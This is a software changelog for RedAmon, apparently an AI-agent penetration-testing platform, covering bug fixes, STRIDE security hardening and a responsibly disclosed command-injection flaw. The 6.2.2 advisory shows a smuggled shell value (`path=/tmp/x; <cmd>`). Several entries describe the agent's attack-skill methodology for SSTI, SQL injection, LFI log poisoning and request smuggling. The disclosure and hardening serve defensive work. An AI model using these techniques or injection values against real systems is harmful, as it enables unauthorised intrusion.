- **Memory-governor tuning knobs were silently inert.** The recon-orchestrator service has no `env_file`, so a variable only reaches it if listed in its compose `environment:` block. `RECON_JOB_ENVELOPE_MEM`, `OS_HEADROOM_MEM`, `SERVICE_BASELINE_MEM`, `REDAMON_MEM_GOVERNOR`, `RESOURCE_PROFILE_PATH` and the `MEM_*` fractions were documented in `.env.example` but never wired, so a small-host operator following the "lower `RECON_JOB_ENVELOPE_MEM`" advice above (from the docs and the rejection message) saw no effect. Now wired in [docker-compose.yml](docker-compose.yml) alongside the D1 CPU/PID knobs, all passed through empty so unset keeps the safe defaults.

---

## [6.2.6] - 2026-07-29

### Fixed

- **`redamon-agent` container crash-looped on a clean build (issue #161).** The `mcp` dependency was unpinned (only a transitive dep of `langchain-mcp-adapters>=0.1.0`), so a fresh `purge && install` resolved `mcp` up to the new **2.0.0** major, which removed `RequestContext` from `mcp.shared.context`. `langchain-mcp-adapters 0.3.x` still imports that name, so the agent failed at import (`ImportError: cannot import name 'RequestContext' from 'mcp.shared.context'`) and restarted forever. Both packages are now pinned to the known-good pair (`langchain-mcp-adapters==0.3.0`, `mcp==1.28.1`) in [agentic/requirements.txt](agentic/requirements.txt); existing images already on `mcp 1.28.1` were unaffected, which is why the crash only surfaced on clean builds. Operators updating must rebuild the agent image: `docker compose build agent && docker compose up -d agent`.

---

## [6.2.5] - 2026-07-28

### Fixed

- **Terminal and AI Agent hung on "Connecting…" when RedAmon was opened over the LAN (issue #159).** A plain `docker compose up` deploy (no reverse proxy) reached by IP/hostname built the WebSocket URL from the page origin (`ws://<host>:3000/ws/*`), but port 3000 runs no WebSocket server, so both sockets hung forever — only `localhost` worked. The server now injects a runtime routing hint so the browser dials the agent's published port (`ws://<host>:8090/ws/*`) with zero config, while reverse-proxied and single-host deploys keep same-origin routing untouched. Tunable at runtime (no rebuild) via `AGENT_WS_MODE` / `AGENT_WS_PUBLIC_URL`. Covered by [webapp/src/hooks/agentWsUrl.test.ts](webapp/src/hooks/agentWsUrl.test.ts).
- **Metasploit MCP progress server spammed the kali-sandbox log with `BrokenPipeError` double-tracebacks.** A client polling the progress/session endpoint and disconnecting mid-response left the response writers (`_send_json` and the 404/204 paths) writing to a dead socket, then the error handler wrote a 500 to the same socket and faulted again. All response writes now swallow client-disconnect errors. Covered by [mcp/servers/tests/test_metasploit_progress.py](mcp/servers/tests/test_metasploit_progress.py).
- **Neo4j authentication error on install/update when the `.env` password disagreed with the volume (issue #160).** The password is baked into the neo4j data volume at first init and ignored thereafter, so a hand-set or rotated `.env` value could mismatch and surface later as a cryptic `AuthenticationRateLimit` lockout. `redamon.sh` now verifies the pinned password against the live volume, clears the rate-limit (restart), and reconciles by rotating the volume to the `.env` value (via `NEO4J_PASSWORD_OLD` or the legacy default), or stops with actionable steps. The insecure `changeme123` fallback is removed from the KB Makefile and the per-service compose files (now fail-closed `${NEO4J_PASSWORD:?}`), and Knowledge Base `make` runs receive the real password from `.env`. Covered by [tests/redamon_secrets_test.sh](tests/redamon_secrets_test.sh).

### Changed

- **TrafficMind capture-proxy config is now DB-driven and hot-reloaded — no more env drift.** The egress guard and body-storage policy were baked into the proxy's env at container spawn, so a bring-up could silently diverge from the saved settings (a stale env kept blocking private lab targets even with the UI toggle off). The DB is now the single source of truth: the orchestrator materialises the settings to a shared file the credential-free proxy hot-reloads within seconds — changes apply live with no restart, any start path converges to the DB, and egress/body edits no longer recreate the proxy. Fail-safe throughout (a missing/invalid config blocks all egress). Covered by [capture_proxy/tests/test_capture_config.py](capture_proxy/tests/test_capture_config.py) and [recon_orchestrator/tests/test_capture_config_reconcile.py](recon_orchestrator/tests/test_capture_config_reconcile.py).
- **LFI and SSTI skills sharpened (general methodology).** Path-traversal gained a mandatory include-vs-stream sink discriminator and log-poisoning payload hygiene (read the target as data, quote-safe payload, corrupted-log pivot); the RCE/SSTI skill gained a constraint-driven filter-bypass menu for character-restricted template sinks.

---

## [6.2.4] - 2026-07-27

### Added

- **HTTP Request Smuggling attack skill.** A new built-in `http_request_smuggling` class (general CL.TE / TE.CL / TE.TE desync methodology with raw-socket tooling) so the agent can detect and exploit front/back-end request-boundary disagreements. Enabled by default; classification, workflow, and behaviour wired end-to-end and covered by [agentic/tests/test_http_smuggling_skill.py](agentic/tests/test_http_smuggling_skill.py) (including a fairness guard that the skill carries no target-specific hints).

### Changed

- **Exploit-Path Search (LATS) scores each probe by an LLM-assigned response class (24-class taxonomy).** Replaces the coarse `verdict` + `error_class` scoring: a bypassable input filter (e.g. an SSTI blacklist) is now kept alive instead of pruned like a dead endpoint, and each class carries an actionable reflection. Reflection-conditioned expansion then makes the next wave act on that class (mutate the payload, extract from a leaked error, ...) instead of a generic pivot. Covered by [agentic/tests/test_lats_response_class.py](agentic/tests/test_lats_response_class.py).
- **LATS trees now compound knowledge across a run.** A finished tree passes forward its confirmed LEADS and confirmed-dead `class @ target` pairs (with the one-line lesson), merged and deduped across every prior tree, so a later tree stops re-deriving dead ends instead of inheriting bare tool names. A diagnostic/tooling failure is never recorded as ruled-out. Covered by [agentic/tests/test_lats_cross_tree_digest.py](agentic/tests/test_lats_cross_tree_digest.py).
- **SQLi and LFI skills sharpened (general methodology).** Blind-oracle stability discipline for boolean/time extraction (re-verify and re-establish a session-bound oracle before trusting extracted characters), and a fixed-path-prefix to code-execution (log-poisoning) pivot for when PHP stream wrappers cannot reach a target file.

### Fixed

- **`execute_curl` disables curl URL globbing (`--globoff`).** curl treats `{ } [ ]` in a URL as glob metacharacters and rejected the request with error 3 (URL malformed) before it ever left the harness, silently killing SSTI/template/array payloads; they now reach the target. Covered by [mcp/tests/test_curl_globoff.py](mcp/tests/test_curl_globoff.py).

---

## [6.2.3] - 2026-07-25

### Fixed

- **Concurrent agent sessions cross-contaminated each other's settings, model, and capture routing.** The agent serves all sessions in one event loop but held per-project settings in a module-global singleton and mutated shared LLM / capture fields on the single orchestrator instance, so the last project to start a turn overwrote them for every other session running at the same time. In practice a project with Exploit-Path Search shadow-mode ON forced OBSERVE-ONLY onto concurrent projects that had it OFF (and vice-versa), and two projects on different models could run on each other's LLM. Settings are now bound per asyncio task via `contextvars` (the module global is kept only as a fallback for readers outside a session task), and the session LLM, the capture-proxy gate (`CAPTURE_PROXY_ENABLED`, now read at tool-execution time), and the neo4j text-to-Cypher LLM are all resolved per session. Covered by [agentic/tests/test_settings_llm_isolation.py](agentic/tests/test_settings_llm_isolation.py) (16 unit / integration / concurrency checks, including the race reproduced on the pre-fix code); no regression across the full agent suite.
- **Exploit-Path Search (LATS) now drives by default when enabled.** The per-project `agentLatsShadowMode` default was flipped from `true` (observe-only) to `false` (drive) across the Prisma schema, the agent defaults, and the AI Agent Behaviour form, so an enabled search issues probes instead of only building the tree. Existing projects keep their stored value.
- **Web UI: each project now restores its own agent session.** Selecting a different project from the top dropdown used to leave the previous project's conversation on screen (and route new messages to it), because the open session was tracked globally. It is now remembered per project and restored on switch (a fresh chat when the project has none).
- **Web UI: a pending "Agent Question" no longer follows you into other sessions.** The question / approval / tool-confirmation modal is live drawer state whose only cross-session reset was skipped during a conversation restore, so an unanswered prompt could persist onto every session opened afterwards. Restoring a conversation now clears those modals and their guard refs before re-arming only that conversation's genuinely-pending prompt.
- **Web UI: session history shows a loading spinner instead of the previous project's list.** Opening history after a project switch briefly showed the old project's sessions until the fetch finished; the list is now cleared on project change and a spinner is shown while the new project's conversations load.

---

## [6.2.2] - 2026-07-25

### Security

- **Unauthenticated OS command injection (RCE) in the agent `GET /files` endpoint closed (CWE-78).** The in-chat file-download endpoint ([agentic/api.py](agentic/api.py)) read a file inside kali-sandbox by interpolating the untrusted `path` query parameter into a `bash -c` command run through the `kali_shell` MCP tool, guarded only by `os.path.normpath` plus a `/tmp/` prefix check. Neither strips shell metacharacters, so `path=/tmp/x; <cmd>` executed arbitrary commands as root inside kali-sandbox, and the route carried no authentication of its own. On a default `docker compose` / `redamon.sh install` the agent is published on `0.0.0.0:8090`, so this was remotely reachable; the `deploy/single-host` hardened posture already keeps the agent REST surface off the public origin (nginx proxies only the four `/ws/*` paths), so that posture was not internet-exposed, though the endpoint stayed reachable unauthenticated container-to-container. The `path` is now `shlex.quote`d in both `kali_shell` sinks so it is always a single literal argument (neutralising `;`, `|`, backtick, `$(...)`, `&&`, and also repairing legitimate filenames with spaces/parens that the unquoted form had broken), and the route now requires `require_internal_auth_only`; the webapp `/api/agent/files` proxy forwards `internalKeyHeaders()` so the now-authenticated endpoint keeps working ([webapp/src/app/api/agent/files/route.ts](webapp/src/app/api/agent/files/route.ts)). Responsibly disclosed by threatroute66; tracked as [GHSA-vqf8-hfgc-v5cf](https://github.com/samugit83/redamon/security/advisories/GHSA-vqf8-hfgc-v5cf) (CVE pending assignment).
- Covered by [agentic/tests/test_files_injection.py](agentic/tests/test_files_injection.py) (21 unit/regression checks: a `shlex.split` argument-boundary proof over 11 injection/edge vectors plus real `TestClient` auth enforcement) and [tests/test_files_injection_live.sh](tests/test_files_injection_live.sh) (6 live end-to-end checks against the running agent + kali-sandbox: 401 unauthenticated, benign and spaced-filename downloads, and three injection classes proven inert via marker files), plus a webapp route test asserting the internal key is forwarded. Both suites are proven to fail on the pre-fix code.
- Operators updating an existing deployment must rebuild both changed images: `docker compose build agent webapp && docker compose up -d agent webapp`.

---

## [6.2.1] - 2026-07-25

### Fixed

- **Fresh install no longer aborts silently (`#157`, `#158`).** On a first-time install the generated `.env` has no `POSTGRES_DB` line, so an unguarded `var="$(grep '^POSTGRES_DB=' ... )"` inside `ensure_auth_secrets` failed under `set -euo pipefail` (grep exits non-zero -> `pipefail` -> `set -e`), killing `./redamon.sh install` right after the auth tokens were generated, before the database passwords were written. `status`/`up` then failed with `POSTGRES_PASSWORD must be set` from the fail-closed compose guards. This was not OS-specific; the "Arch Linux" and "Kali Linux" reports were the same fresh-install bug. All env reads now go through a helper that can never return non-zero, and a regression test exercises the install path under `set -e`.

---

## [6.2.0] - 2026-07-23

### Added

- **Exploit-Path Search (LATS).** An opt-in, value-guided tree search over executed exploit probes, running as a single hook inside the think node (same model, no new graph node). It activates during exploitation when the agent finds two or more credible attack paths, fans them out, scores each probe by how close it got to a foothold, concentrates the budget on the highest-value line via UCT, and prunes WAF/403 dead ends. Off by default and shadow-mode by default (builds/streams the tree without driving); every knob (budget, depth, branch width, activation sensitivity, exploration-vs-focus, prune floor, node cap) is per-project in AI Agent Behaviour. Live tree card in the agent drawer plus an expandable React Flow modal with per-node inspector and replay. Operator guide in the [Exploit-Path Search (LATS) wiki page](https://github.com/samugit83/redamon/wiki/Exploit-Path-Search-LATS); architecture in [readmes/README.AGENTIC_SYSTEM.md](readmes/README.AGENTIC_SYSTEM.md#exploit-path-search-lats).

---

## [6.1.1] - 2026-07-21

### Added

- **Granular per-family body storage for TrafficMind.** Each captured body is now routed by content-type family (text, JSON, script, image, font, video, audio, document, archive, binary) to one of four policies: `auto` (size-based), `inline` (database column), `disk` (offloaded blob), or `meta` (drop the bytes, keep only size + sha256). A new **Max store (MB)** ceiling drops oversized bodies to metadata regardless of policy, and request vs response bodies can be kept independently. The shipped **Recommended** preset keeps text / JSON / scripts, drops media noise (images, fonts, video, audio) as `meta`, and offloads leak-worthy downloads (documents, archives, binaries) to disk. Fonts and images mislabeled as `application/octet-stream` are reclassified by filename extension.

### Changed

- **TrafficMind settings moved to the TrafficMind page.** The admin-only settings now open from a **Settings** button on the `/traffic` toolbar in a scrollable modal, instead of the System section of Global Settings. Every control saves automatically the moment you change it (number fields when you click away), persisting only the changed field.

### Fixed

- **A malformed numeric capture env no longer kills capture.** `CAPTURE_MAX_STORE_MB` / `CAPTURE_PROXY_MAX_BODY_KB` now fall back to their defaults instead of crash-loading the proxy addon, which previously stopped all capture silently.

---

## [6.1.0] - 2026-07-19

### Added

- **TrafficMind: engagement-scoped HTTP traffic capture.** A built-in, credential-free man-in-the-middle proxy sits between every offensive tool and its target, records the full request/response of each HTTP transaction, tags it with who produced it (project / user / run / tool via a signed `X-Redamon-Ctx` HMAC context tag), and stores it in Postgres through a trusted, INSERT-only ingest worker. It is Burp-style HTTP history that turns on with a toggle, attributes every request to its source, and is queryable by both the operator and the AI agent. Off by default, two-level gate (global master switch + per-project routing), SSRF egress guard with DNS-rebinding IP pin, secret redaction, passive signal detection (reflected params, missing security headers, cookie-flag issues), content-addressed body offload, CSV/JSON export, and ref-counted body GC. A new **TrafficMind** view in the top navigation exposes the corpus as a paginated, filterable table with a request/response detail drawer. Full architecture in [readmes/README.TRAFFIC.md](readmes/README.TRAFFIC.md); operator guide in the [TrafficMind wiki page](https://github.com/samugit83/redamon/wiki/TrafficMind).
- **Ten `proxy_*` agent tools over the captured corpus.** Eight read-only analysis tools (`proxy_search`, `proxy_get`, `proxy_sitemap`, `proxy_params`, `proxy_grep`, `proxy_diff`, `proxy_to_curl`, `proxy_query`) turn the traffic history into an interactive attack loop, and two active tools (`proxy_replay`, `proxy_fuzz`) resend or Intruder-style fuzz a captured request. All ten are strictly tenant-scoped (tenant from ContextVars, never tool args; every WHERE hard-injects `project_id` + `user_id`), `proxy_query` is a constrained allowlisted query builder with no raw-SQL surface. The two active tools are host-pinned to their origin (no scope/SSRF pivot), re-captured with `isReplay` / `originId` lineage, danger-flagged, phase-gated (exploitation / post-exploitation only), and stealth-restricted (`proxy_fuzz` forbidden in stealth).
- **Eight agent HTTP tools routed through the capture proxy** (`execute_curl`, `execute_httpx`, `execute_playwright`, `execute_nuclei`, `execute_katana`, `execute_ffuf`, `execute_arjun`, `execute_wpscan`), mirroring the recon pipeline so the agent's own crawl/fuzz/scan traffic is captured, searchable, and replayable. Routing fails open: if the proxy is enabled but unreachable, tools run direct with no tag and no scan failure.

---

## [6.0.3] - 2026-07-19

### Added

- **Per-provider reasoning effort for OpenAI-compatible (Ollama) providers.** Global Settings -> LLM Providers now exposes an opt-in control (`low`/`medium`/`high`/`max`) forwarded as `reasoning_effort`. Left disabled it sends nothing, preserving the model's default thinking behavior.

### Fixed

- **Reasoning on a non-thinking model no longer breaks the run.** Such models reject `reasoning_effort` with a permanent 400; `retry_llm_call` now drops the param and retries once, mirroring the existing `temperature` self-heal.
- **Truncated LLM JSON decisions are recovered.** A conservative scanner closes only unambiguous trailing `}`/`]`, so a decision cut off at the token limit no longer fails the step.
- **New queries no longer replay the previous turn's thinking and tool events.** Transient streaming state is cleared when a query merges into an existing session checkpoint.

---

## [6.0.2] - 2026-07-15

### Fixed

- **Orchestrator no longer freezes during parallel/long scans.** Synchronous Docker calls on the single event loop (status polls, scan spawns, and a per-log-line `container.reload()`) are moved onto dedicated thread pools and the liveness check is throttled, so health checks, status polls, and new scan starts stay responsive even during a GraphQL scan plus many parallel partial recons. Covers recon, partial recon, GVM, GitHub-hunt, and TruffleHog.
- **Client-side crash after starting a scan.** The memory governor's structured rejection payload was forwarded as an object and rendered as a React child ("Objects are not valid as a React child"), taking the whole page down. All scan start routes now normalize it to a string via a shared helper, and a new root `global-error.tsx` boundary catches any other render error instead of white-screening.
- **False "not enough RAM" scan rejections.** Every scan reserved a flat 4 GB envelope (~26x the measured ~150 MB peak), so a few parallel partial recons exhausted the reserved budget while 10+ GB was still free. Envelopes right-sized: partial recon 512 MB, full recon 1.5 GB.
- **Webapp requests to a hung orchestrator no longer hang.** `orchestratorFetch` now applies a default timeout (SSE log streams exempt), so a stalled backend surfaces a clean error instead of a 60s hang.

### Changed

- Default concurrent-scan ceilings raised from 10/20 to 30/30 (`RECON_MAX_CONCURRENT_PER_USER`, `RECON_MAX_CONCURRENT_GLOBAL`).

---

## [6.0.1] - 2026-07-14

### Fixed

- **Browser -> agent WebSocket fallback no longer hardcodes a public `:8090`.** When `NEXT_PUBLIC_AGENT_WS_URL` is not baked into the webapp build, the four WS hooks (chat `/ws/agent`, Kali terminal, both cypherfix sockets) previously fell back to `ws://<host>:8090/ws/...`, which bypasses the nginx single-origin funnel and, in a hardened deploy where the agent port is loopback-bound, is unreachable from the browser (Kali Terminal stuck on "Connecting to kali-sandbox..." forever). The fallback now reuses the current page origin (`host[:port]`) for any non-localhost host, so traffic flows through whatever reverse proxy serves the page; `localhost`/`127.0.0.1` still target the agent on `:8090` for local dev. This is defense-in-depth behind the [6.0.0] build fix that bakes `NEXT_PUBLIC_AGENT_WS_URL` from the deploy overlay.
- The four hooks now share a single tested helper, [webapp/src/hooks/agentWsUrl.ts](webapp/src/hooks/agentWsUrl.ts) (`buildAgentWsUrl`), replacing four copies of the URL logic. Covered by a regression suite ([webapp/src/hooks/agentWsUrl.test.ts](webapp/src/hooks/agentWsUrl.test.ts)) that asserts no WS path ever emits `:8090` on a proxied host.

---

## [6.0.0] - 2026-07-12

### Security

- **STRIDE remediation and threat model complete.** With wave 2 shipped ([5.5.0]), the STRIDE pass over RedAmon is closed: every enumerated threat is either remediated (fail-closed) or an explicitly accepted, documented residual. The threat model is finalized in [internal/security/README.TM.STRIDE.md](internal/security/README.TM.STRIDE.md), with the system-level view in [readmes/README.TM.SYSTEM_OVERVIEW.md](readmes/README.TM.SYSTEM_OVERVIEW.md).
- **Consolidated security posture** published in [readmes/README.SECURITY_POSTURE.md](readmes/README.SECURITY_POSTURE.md) - a single reference for the enforced controls (auth, tenant isolation, fail-closed secrets, WS ticketing, rate/spend limits, audit logging), the trust boundaries, and the accepted residuals with their rationale.

### Added

- **Single-host deploy pipeline** under [deploy/single-host/](deploy/single-host/): a one-command `./deploy.sh init` that provisions and hardens a fresh host end to end (repo checkout, `redamon.sh` install, host tuning). Configuration is a single deploy-time `.env` with four public-access modes (`https-domain` / `https-ip` / `http-domain` / `http-ip`), TLS via Let's Encrypt / provided / self-signed, and defense-in-depth host hardening: nginx access gate + ufw allow-lists, key-only SSH, fail2ban, unattended security upgrades, and per-run shredding of the remote secrets. Idempotent `install` / `update` / `dev` flows converge to the same fully-enforced state.

---

## [5.5.0] - 2026-07-12

### Security

- **STRIDE remediation wave 2 - 22 threats closed, each an independently-verified, provably non-breaking commit** (plan: [internal/security/REMEDIATION_PLAN.WAVE2.md](internal/security/REMEDIATION_PLAN.WAVE2.md)). Every fail-open control now fails **closed** while staying non-breaking for real installs (all the required secrets already auto-generate via `redamon.sh`).
  - **S9 / S5** - the Kali MCP bearer middleware and the tunnel-manager `:8015` now **reject** when their token is unset instead of serving everyone; no unauthenticated fallback on wrapper/import error ([mcp/servers/_auth_middleware.py](mcp/servers/_auth_middleware.py), [mcp/servers/run_servers.py](mcp/servers/run_servers.py), [mcp/servers/tunnel_manager.py](mcp/servers/tunnel_manager.py)).
  - **S13** - default DB credentials are **fail-closed** in compose (`${VAR:?}`), and `ensure_db_secrets` now **rotates** an already-initialised default volume in place (ALTER the live DB first, then pin `.env`; Community-safe Neo4j `ALTER CURRENT USER`), fail-safe on error ([docker-compose.yml](docker-compose.yml), [redamon.sh](redamon.sh)).
  - **S2 / S3 / S4** - `/ws/agent`, `/ws/kali-terminal`, and both `/ws/cypherfix-*` sockets require a signed ws-ticket + a server-side same-origin check; identity is bound from verified claims, not the self-asserted frame ([agentic/websocket_api.py](agentic/websocket_api.py), [agentic/api.py](agentic/api.py), [agentic/ws_ticket.py](agentic/ws_ticket.py), [agentic/cypherfix_triage/websocket_handler.py](agentic/cypherfix_triage/websocket_handler.py), [agentic/cypherfix_codefix/websocket_handler.py](agentic/cypherfix_codefix/websocket_handler.py) + the KaliTerminal/cypherfix hooks).
  - **S8 / I8 / D7 / R12** - `/graph/exec` and `/emergency-stop-all` now require `require_internal_auth`; the Kali worker presents the scoped `SCANNER_API_KEY`; `apoc.atomic.*` added to the write-block; body-identity is dual-mode (logged) pending the R12 enforce wave ([agentic/api.py](agentic/api.py), [mcp/servers/redagraph.py](mcp/servers/redagraph.py), [graph_db/tenant_filter.py](graph_db/tenant_filter.py)).
  - **E1** - the docker-broker now gates operate-on-existing verbs (exec/attach/kill/archive/...) to broker-owned containers via a marker label + upstream inspect, and scopes `GET /containers/json` to owned - closing the exec-into-infra → host-root pivot ([docker_broker/broker.py](docker_broker/broker.py)).
  - **R1 / R2 / R5 / S11 / S12** - append-only `AuditLog`/`ActAsAudit` tables + nullable actor columns; act-as and auth events (login success/failure/logout, source IP) audited; in-memory per-account+per-IP login lockout (429 + `Retry-After`); the session cookie's `Secure` flag is now decided in-app from `x-forwarded-proto` ([webapp/prisma/schema.prisma](webapp/prisma/schema.prisma), [webapp/src/lib/audit.ts](webapp/src/lib/audit.ts), [webapp/src/lib/loginThrottle.ts](webapp/src/lib/loginThrottle.ts), [webapp/src/lib/cookieSecurity.ts](webapp/src/lib/cookieSecurity.ts), auth routes).
  - **D3 / D10** - global + per-user concurrent-scan ceilings at admission (released on every termination path); project-import and agent `fs_extract` zip/tar/gz decompression caps ([recon_orchestrator/admission_ledger.py](recon_orchestrator/admission_ledger.py), [webapp/src/app/api/projects/import/route.ts](webapp/src/app/api/projects/import/route.ts), [agentic/workspace_fs.py](agentic/workspace_fs.py)).
  - **I4 / I5** - harvested secret values no longer printed to github-hunt stdout; a log redaction filter scrubs token shapes from every agent handler, the LLM-provider test returns a generic error, and the leaked `codefix.log` PAT was purged (rotate it in GitHub) ([github_secret_hunt/github_secret_hunt.py](github_secret_hunt/github_secret_hunt.py), [agentic/logging_config.py](agentic/logging_config.py), [agentic/api.py](agentic/api.py)).
  - **T3 / I7** - deploy patches are sha256-verified and fatal-on-failure (the secure-cookie and cypherfix-ws-origin patches were folded into the base app and dropped); the remote `deploy.env` + `cert/` are shred+removed on run exit ([deploy/single-host/deploy.sh](deploy/single-host/deploy.sh)).
- New optional override knobs, all with **safe generous defaults** so unset fails safe to a real limit: `RECON_MAX_CONCURRENT_GLOBAL` (20), `RECON_MAX_CONCURRENT_PER_USER` (10), `LOGIN_MAX_ATTEMPTS` (5), `LOGIN_LOCKOUT_SECONDS` (900), `PROJECT_IMPORT_MAX_*`, `FS_EXTRACT_MAX_*`, `TRUST_PROXY`. No new secret is introduced. `install` and `update` converge to the same fully-enforced state (S13 rotates a legacy-default volume automatically on update).
- Residuals accepted for this wave (documented in the plan risk register): R12 deep ticket-binding through terminal→redagraph deferred (endpoint is authenticated, tenant still body-derived); S5 loopback rebind dropped in favor of fail-closed bearer (would break the cross-container webapp caller); `/agent-session/stop` left unauthenticated. Release gate: [tests/run_security_remediation_suite.sh](tests/run_security_remediation_suite.sh) (all wave-2 suites + the live S6/I1 E2E green).

---

## [5.4.0] - 2026-07-10

### Security

- **Sequenced STRIDE hardening wave (T15, T17, D3, D1, T1/T2, S2/E2, S3/E6).** Each fix verified before advancing (unit + regression + exploit-repro + live run):
  - **T15** - KB feeds pinned to immutable upstream commits + per-feed sha256 (fail-closed), NVD response-schema validation, pinned embedder/reranker revisions ([knowledge_base/curation/pins.py](knowledge_base/curation/pins.py)).
  - **T17** - recon (and Kali) image build pulls pinned to commits/tags; a moved pin now fails the build loudly ([recon/Dockerfile](recon/Dockerfile), [recon/requirements.txt](recon/requirements.txt)).
  - **D3** - the agent's 9 billed-LLM endpoints now require `X-Internal-Key`/`SCANNER_API_KEY` (constant-time) + token-bucket rate limit + per-user daily spend cap ([agentic/llm_guard.py](agentic/llm_guard.py)).
  - **D1** - per-container CPU + PID caps on all scan spawns and always-on services; `BROKER_TOOL_PIDS` default 0→512 ([recon_orchestrator/container_manager.py](recon_orchestrator/container_manager.py), [docker-compose.yml](docker-compose.yml)).
  - **T1/T2** - the docker-broker enforces bind **mode**: source-tree binds must be `:ro`, read-write only under `ALLOWED_RW_PREFIXES` ([docker_broker/broker.py](docker_broker/broker.py)).
  - **S2/E2** - webapp internal-key is constant-time + allowlist-scoped (log-only, `INTERNAL_KEY_ALLOWLIST_ENFORCE` to enforce); user-CRUD writes require an admin session, so a leaked key can no longer mint an admin ([webapp/src/middleware.ts](webapp/src/middleware.ts), [webapp/src/lib/session.ts](webapp/src/lib/session.ts)).
  - **S3/E6** - scan containers carry a scoped `SCANNER_API_KEY` (settings/projects GET + agent `/llm/*` only) instead of the master key, closing the admin-mint / key-harvest / control-plane escalation ([recon_orchestrator/container_manager.py](recon_orchestrator/container_manager.py), [redamon.sh](redamon.sh)).
- **I2/I3** (plaintext secrets at rest) accepted as a documented residual (loopback DBs, single-operator local host). Threat-model status in [internal/security/README.TM.STRIDE.md](internal/security/README.TM.STRIDE.md); release gate in [tests/run_security_remediation_suite.sh](tests/run_security_remediation_suite.sh). No schema change; `SCANNER_API_KEY` auto-generated by `install`/`update`.

---

## [5.3.5] - 2026-07-10

### Security

- **Per-user access control (BOLA) across the webapp - every data route now scoped to the authenticated owner (completes I1; closes S15/I20/E15)** ([webapp/src/lib/access.ts](webapp/src/lib/access.ts), [webapp/src/lib/session.ts](webapp/src/lib/session.ts), [webapp/src/lib/auth.ts](webapp/src/lib/auth.ts), [webapp/src/app/api/auth/act-as/route.ts](webapp/src/app/api/auth/act-as/route.ts), [webapp/src/providers/ProjectProvider.tsx](webapp/src/providers/ProjectProvider.tsx)). RedAmon's login is real (HS256 JWT in an httpOnly cookie) but **~126 of 163 API routes derived "which user/project" from a client-supplied value** (`?userId=`, body `userId`, or the `[id]`/`[projectId]` path param) and never checked the caller owned the resource - so any logged-in user could read or mutate another user's projects, graph, conversations, scans, remediations, reports, presets, workspace files, and settings by substituting an id, and an admin "simulating" a user X could still reach a **different** user Y's data by pasting a URL (the operator-reported impersonation bug). A single trust core now scopes every request to an **effective user** (`getEffectiveUser`): a standard user is always their own id (any impersonation input ignored); an admin is their own id unless actively simulating X via a signed httpOnly `redamon-act-as` cookie set by the new admin-only `POST/DELETE /api/auth/act-as` (there is no "see everything" mode). Reusable guards (`guardProject`, `requireProjectAccess`, `requireConversationAccess`, `requireProjectScopedResource`, `requireUserAccess`, `ownerScope`) enforce ownership on every scan / analytics / workspace / project / conversation / remediation / report / graph-view / preset / user-scoped route, with an `X-Internal-Key` carve-out so the agent (chat persistence), cypherfix (remediations), and scanners keep working. Cross-user access is reported as **404** (anti-enumeration); enforcement is **on by default** (fail-closed, opt-out via `ACCESS_ENFORCE=0` for a log-only phase). Admin impersonation is now server-enforced end-to-end: the client sets the act-as cookie before switching and reconciles it on load, the agent WebSocket ticket binds the **effective** user (so the agent acts as the simulated user, not the admin), and logout clears the cookie. Also **completes STRIDE I1** - the `?internal=true` cleartext-secret unmask that survived on the single-item `settings`, `tradecraft-resources[/[resourceId]]`, and `llm-providers/[providerId]` routes is now header-gated + ownership-checked, so a logged-in user can no longer read another user's OSINT keys / GitHub token / tunnel credentials. Webapp-only change: **no schema migration, no new secret** (the act-as cookie reuses `AUTH_SECRET`), and **no `docker-compose.yml` change**, so an existing operator's `./redamon.sh update` rebuilds only the webapp image and converges to the fully-enforced state in one run (admins hard-refresh once to load the new client).
- Covered by unit + integration + component tests (`webapp/src/lib/access.test.ts`, [access.composition.test.ts](webapp/src/lib/access.composition.test.ts) - the full impersonation chain against the real resolver, `session.effective.test.ts`, `session.userAccess.test.ts`, `auth.actAs.test.ts`, [ProjectProvider.test.tsx](webapp/src/providers/ProjectProvider.test.tsx), plus per-resource BOLA exploit-repros for projects/graph/export/purge/conversations/remediations/agent-files/ws-ticket) and an authenticated **two-user live E2E** ([tests/test_e2e_bola_live.sh](tests/test_e2e_bola_live.sh)) that seeds two standard users + an admin and asserts 40 checks - cross-user blocked, owner path still works, and admin-simulating-A-pastes-B → blocked. Threat-model status updated in [internal/security/README.TM.STRIDE.md](internal/security/README.TM.STRIDE.md); the authorization model is documented in [readmes/README.WEBAPP.md](readmes/README.WEBAPP.md).

---

## [5.3.4] - 2026-07-10

### Changed

- **Built-in attack-skill prompt hardening — SSTI engine-fingerprinting, SQLi objective-triage + auth-bypass-first, and vulnerability-class → skill routing** ([agentic/prompts/rce_prompts.py](agentic/prompts/rce_prompts.py), [agentic/prompts/sql_injection_prompts.py](agentic/prompts/sql_injection_prompts.py), [agentic/prompts/classification.py](agentic/prompts/classification.py)). The **RCE / SSTI** skill now fingerprints the template engine before concluding "no SSTI": it teaches that sandboxed / logic-less engines (Django templates, Handlebars, Mustache, Liquid, Go `text/template`) do **not** evaluate the `{{7*7}}` arithmetic canary, so a non-`49` result is not evidence the target is safe — confirm instead via **context disclosure** (`{% debug %}` / reading a variable already in the render context), and drive **deferred / stateful render sinks** (multi-step wizards, template-generated emails / PDFs / JS) to their final render before abandoning the class. The **SQL injection** skill gains an **objective-triage gate** (route by *where the target lives* — a DB row → boolean/UNION extraction; a filesystem artifact or code-execution goal → `LOAD_FILE` / `INTO OUTFILE` / an app-level file-upload pivot, not char-by-char extraction) and an **auth-bypass-first** discipline on login forms (sweep every injectable field × multiple payload shapes for a bypass *before* any blind extraction, since login handlers frequently run more than one query and a single failed comment payload does not prove bypass impossible), with an anti-deadlock note bounding blind extraction. A generic **vulnerability-class → housing-skill routing map** lets the agent reach the right skill when a class has no dedicated module (template-injection / expression-language / deserialization / command-injection → `rce`, LFI / directory-traversal → `path_traversal`, etc.) instead of stalling on an unrecognised skill name. All edits are generic, session-agnostic pentest tradecraft.

---

## [5.3.3] - 2026-07-07

### Security

